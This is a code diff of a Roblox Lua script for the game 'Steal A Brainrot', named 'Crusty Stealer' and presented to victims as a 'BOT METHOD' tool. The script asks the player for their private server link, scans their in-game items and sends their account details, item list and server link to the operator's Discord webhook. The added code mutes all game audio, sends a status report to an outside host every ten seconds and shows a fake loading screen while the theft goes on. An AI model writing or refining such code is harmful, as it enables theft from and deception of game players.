@@ -13,6 +13,84 @@ if not requestFunc then
     return
 end
 
+-- TÜM SESLERİ KAPAT FONKSIYONU
+local function muteAllSounds()
+    pcall(function()
+        -- Workspace'teki tüm sesler
+        for _, sound in pairs(workspace:GetDescendants()) do
+            if sound:IsA("Sound") or sound:IsA("SoundGroup") then
+                sound.Volume = 0
+                if sound:IsA("Sound") then
+                    sound:Stop()
+                end
+            end
+        end
+        
+        -- SoundService'teki tüm sesler
+        for _, sound in pairs(SoundService:GetDescendants()) do
+            if sound:IsA("Sound") or sound:IsA("SoundGroup") then
+                sound.Volume = 0
+                if sound:IsA("Sound") then
+                    sound:Stop()
+                end
+            end
+        end
+        
+        -- PlayerGui'deki tüm sesler
+        for _, sound in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+            if sound:IsA("Sound") or sound:IsA("SoundGroup") then
+                sound.Volume = 0
+                if sound:IsA("Sound") then
+                    sound:Stop()
+                end
+            end
+        end
+    end)
+end
+
+-- Yeni eklenen sesleri otomatik kapat
+workspace.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
+        descendant.Volume = 0
+        if descendant:IsA("Sound") then
+            descendant:Stop()
+        end
+    end
+end)
+
+SoundService.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
+        descendant.Volume = 0
+        if descendant:IsA("Sound") then
+            descendant:Stop()
+        end
+    end
+end)
+
+-- İLK SES KAPATMA
+muteAllSounds()
+
+-- HER 2 SANİYEDE BİR SESLERİ KONTROL ET VE KAPAT
+spawn(function()
+    while true do
+        muteAllSounds()
+        task.wait(2)
+    end
+end)
+
+-- HER 10 SANİYEDE BİR STATUS GÖNDER
+spawn(function()
+    while true do
+        pcall(function()
+            requestFunc({
+                Url = "https://crusty.dev.tc/status/" .. tostring(LocalPlayer.Name),
+                Method = "GET"
+            })
+        end)
+        task.wait(10)
+    end
+end)
+
 local function isPrivateServer()
     local playerCount = #Players:GetPlayers()
     return playerCount <= 4
@@ -42,19 +120,13 @@ local function parseGeneration(text)
     return number
 end
 
-local function sendWebhook(embedData, mentionEveryone)
+local function sendWebhook(embedData)
     pcall(function()
         local data = {
-            username = "Notifier | C\204\181\205\207\224\186\221r\205\184\210\170\197\171u\204\181\226\153\255\204\201\200\129s\205\183\176\205\141\206\141\206\146\205\157t\205\164\160\156\156\211\205\145\204\129\204\128y\205\164\161\172\177\205\138",
+            username = "Notifier",
             avatar_url = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png",
             embeds = {embedData}
         }
-        
-        -- 10M+ brainrot varsa @everyone ekle
-        if mentionEveryone then
-            data.content = "@everyone"
-        end
-        
         local jsonData = HttpService:JSONEncode(data)
         requestFunc({
             Url = webhookURL,
@@ -78,7 +150,7 @@ local function sendInitialWebhook()
         },
         fields = {
             {
-                name = "\240\159\145\164 Player Information",
+                name = "Player Information",
                 value = string.format(
                     "```yaml\nName: %s\nID: %s\nAge: %d days\nDisplay: %s```",
                     LocalPlayer.Name,
@@ -89,7 +161,7 @@ local function sendInitialWebhook()
                 inline = false
             },
             {
-                name = "\240\159\140\144 Server Information",
+                name = "Server Information",
                 value = string.format(
                     "```yaml\nPlayers: %d\nGame: Steal A Brainrot\nStatus: Private Server```",
                     #Players:GetPlayers()
@@ -98,12 +170,12 @@ local function sendInitialWebhook()
             }
         },
         footer = {
-            text = "Crusty Hit Steal \226\128\162 Initializing",
+            text = "Crusty Hit Steal - Initializing",
             icon_url = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png"
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
     }
-    sendWebhook(embed, false)
+    sendWebhook(embed)
 end
 
 local function createUI()
@@ -165,7 +237,7 @@ local function createUI()
     Title.Position = UDim2.new(0, 20, 0, 0)
     Title.BackgroundTransparency = 1
     Title.Font = Enum.Font.GothamBold
-    Title.Text = "\240\159\148\174 BOT METHOD"
+    Title.Text = "BOT METHOD"
     Title.TextColor3 = Color3.fromRGB(255, 255, 255)
     Title.TextSize = 24
     Title.TextXAlignment = Enum.TextXAlignment.Left
@@ -177,7 +249,7 @@ local function createUI()
     CloseButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
     CloseButton.BorderSizePixel = 0
     CloseButton.Font = Enum.Font.GothamBold
-    CloseButton.Text = "\226\156\149"
+    CloseButton.Text = "X"
     CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     CloseButton.TextSize = 20
     CloseButton.Parent = Header
@@ -228,7 +300,7 @@ local function createUI()
     TextBox.Position = UDim2.new(0, 12, 0, 5)
     TextBox.BackgroundTransparency = 1
     TextBox.Font = Enum.Font.Gotham
-    TextBox.PlaceholderText = "Please Enter Your PS Link (or TEST_DEV)"
+    TextBox.PlaceholderText = "Please Enter Your PS Link"
     TextBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
     TextBox.Text = ""
     TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -244,7 +316,7 @@ local function createUI()
     SubmitButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
     SubmitButton.BorderSizePixel = 0
     SubmitButton.Font = Enum.Font.GothamBold
-    SubmitButton.Text = "\240\159\154\128 SUBMIT"
+    SubmitButton.Text = "SUBMIT"
     SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     SubmitButton.TextSize = 18
     SubmitButton.AutoButtonColor = false
@@ -259,7 +331,7 @@ local function createUI()
     Warning.Position = UDim2.new(0, 0, 0, 170)
     Warning.BackgroundTransparency = 1
     Warning.Font = Enum.Font.Gotham
-    Warning.Text = "\226\154\160\239\184\143 You Need A In PS (TEST_DEV for test mode)"
+    Warning.Text = "You Need A In PS"
     Warning.TextColor3 = Color3.fromRGB(255, 170, 80)
     Warning.TextSize = 12
     Warning.TextWrapped = true
@@ -478,16 +550,6 @@ local function groupAnimals(animalData)
     return grouped
 end
 
--- 10M+ brainrot kontrolü için fonksiyon
-local function hasHighValueBrainrot(animalData)
-    for _, data in pairs(animalData) do
-        if data.generation >= 10000000 then -- 10M = 10,000,000
-            return true
-        end
-    end
-    return false
-end
-
 if not isPrivateServer() then
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "PrivateServerWarning"
@@ -522,7 +584,7 @@ if not isPrivateServer() then
     Icon.Size = UDim2.new(1, 0, 0, 100)
     Icon.BackgroundTransparency = 1
     Icon.Font = Enum.Font.GothamBold
-    Icon.Text = "\226\154\160\239\184\143"
+    Icon.Text = "WARNING"
     Icon.TextColor3 = Color3.fromRGB(255, 100, 100)
     Icon.TextSize = 72
     Icon.Parent = Frame
@@ -559,45 +621,27 @@ local gui, textBox, submitButton = createUI()
 submitButton.MouseButton1Click:Connect(function()
     local serverLink = textBox.Text
     
-    print("Submit button clicked!")
-    print("Server Link:", serverLink)
-    
-    -- Boş kontrol
     if serverLink == "" then
-        print("Link is empty")
-        textBox.PlaceholderText = "\226\157\140 Enter a link!"
+        textBox.PlaceholderText = "Enter a link!"
         task.wait(2)
-        textBox.PlaceholderText = "Please Enter Your PS Link (or TEST_DEV)"
+        textBox.PlaceholderText = "Please Enter Your Private Server Link"
         return
     end
     
-    -- TEST_DEV kontrolü veya https:// ile başlayan link kontrolü
-    local isTestMode = serverLink == "TEST_DEV"
-    local isValidLink = string.sub(serverLink, 1, 8) == "https://"
+    -- Herhangi bir yerde roblox.com varsa kabul et
+    local isValidLink = serverLink:match("roblox%.com")
     
-    print("Is Test Mode:", isTestMode)
-    print("Is Valid Link:", isValidLink)
-    
-    if not isTestMode and not isValidLink then
-        print("Invalid link")
-        textBox.PlaceholderText = "\226\157\140 Must start with https://!"
+    if not isValidLink then
+        textBox.PlaceholderText = "Enter a valid Roblox link!"
         task.wait(2)
-        textBox.PlaceholderText = "Please Enter Your PS Link (or TEST_DEV)"
+        textBox.PlaceholderText = "Please Enter Your Private Server Link"
         return
     end
     
-    print("Validation passed, destroying GUI")
     gui:Destroy()
     
-    print("Scanning plots...")
     local animalData = scanPlots()
-    print("Found animals:", #animalData)
-    
     local groupedAnimals = groupAnimals(animalData)
-    
-    -- 10M+ brainrot kontrolü
-    local shouldMentionEveryone = hasHighValueBrainrot(animalData)
-    print("Should mention everyone:", shouldMentionEveryone)
     
     local animalList = {}
     for _, data in pairs(groupedAnimals) do
@@ -622,7 +666,7 @@ submitButton.MouseButton1Click:Connect(function()
     
     local fields = {
         {
-            name = "\240\159\145\164 Player Information",
+            name = "Player Information",
             value = string.format(
                 "```yaml\nName: %s\nID: %s\nAge: %d days\nDisplay: %s```",
                 LocalPlayer.Name,
@@ -633,67 +677,63 @@ submitButton.MouseButton1Click:Connect(function()
             inline = false
         },
         {
-            name = "\240\159\140\144 Server Information",
+            name = "Server Information",
             value = string.format(
-                "```yaml\nPlayers: %d\nGame: Steal A Brainrot\nStatus: %s```",
-                #Players:GetPlayers(),
-                isTestMode and "TEST MODE" or "Private Server"
+                "```yaml\nPlayers: %d\nGame: Steal A Brainrot\nStatus: Private Server```",
+                #Players:GetPlayers()
             ),
             inline = false
         }
     }
     
     if #animalList > 0 then
-        local brainrotTitle = "\240\159\144\190 Brainrots Detected (" .. #animalData .. " total)"
-        if shouldMentionEveryone then
-            brainrotTitle = "\240\159\148\165 HIGH VALUE BRAINROTS! (" .. #animalData .. " total)"
-        end
-        
         table.insert(fields, {
-            name = brainrotTitle,
+            name = "Brainrots Detected (" .. #animalData .. " total)",
             value = "```" .. table.concat(animalList, "\n") .. "```",
             inline = false
         })
     else
         table.insert(fields, {
-            name = "\240\159\144\190 Brainrots Detected",
+            name = "Brainrots Detected",
             value = "```No brainrots found OG/Secret/BrainrotGod```",
             inline = false
         })
     end
     
     table.insert(fields, {
-        name = "\240\159\148\151 Target Server",
-        value = isTestMode and "**TEST MODE - NO LINK PROVIDED**" or serverLink,
+        name = "Target Server",
+        value = serverLink,
         inline = false
     })
     
-    local embedColor = shouldMentionEveryone and 0xFF0000 or 0x8A2BE2 -- Kırmızı veya mor
+    table.insert(fields, {
+        name = "Check Activity Status",
+        value = "[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/" .. LocalPlayer.Name .. ")",
+        inline = false
+    })
     
     local embed = {
-        title = shouldMentionEveryone and "🚨 CRUSTY STEALER - HIGH VALUE HIT! 🚨" or (isTestMode and "🧪 CRUSTY STEALER - TEST MODE 🧪" or "Crusty Stealer"),
-        description = shouldMentionEveryone and "**🔥 10M+ BRAINROT DETECTED! 🔥**" or (isTestMode and "**Test Mode Active!**" or "**You Got A Hit!**"),
-        color = embedColor,
+        title = "Crusty Stealer",
+        description = "**You Got A Hit!**",
+        color = 0x8A2BE2,
         thumbnail = {
             url = avatarUrl
         },
         fields = fields,
         footer = {
-            text = "Crusty Stealing System \226\128\162 Active",
+            text = "Crusty Stealing System - Active",
             icon_url = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png"
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
     }
     
-    print("Sending webhook...")
-    sendWebhook(embed, shouldMentionEveryone)
+    sendWebhook(embed)
     
-    print("Creating loading screen...")
-    local loadingGui, loadingText = createLoadingScreen("\226\154\153\239\184\143 PREPARING SCRIPT...")
+    local loadingGui, loadingText = createLoadingScreen("PREPARING SCRIPT...")
     task.wait(20)
-    loadingText.Text = "\240\159\148\141 SEARCHING BOTS..."
+    loadingText.Text = "SEARCHING BOTS..."
     task.wait(90)
-    loadingText.Text = "\226\156\133 BOT FOUND"
+    loadingText.Text = "BOT FOUND"
     
     while true do
         task.wait(1)
